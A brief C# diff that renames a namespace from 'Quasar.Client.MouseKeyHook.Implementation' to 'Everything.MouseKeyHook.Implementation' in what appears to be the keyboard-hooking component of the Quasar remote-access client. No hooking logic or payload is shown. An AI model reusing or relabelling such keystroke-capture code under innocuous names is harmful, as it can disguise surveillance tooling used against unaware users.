@@ -8,7 +8,7 @@ using System.Linq;
 using System.Windows.Forms;
 using Quasar.Client.Utilities;
 
-namespace Quasar.Client.MouseKeyHook.Implementation
+namespace Everything.MouseKeyHook.Implementation
 {
     /// <summary>
     ///     Contains a snapshot of a keyboard state at certain moment and provides methods
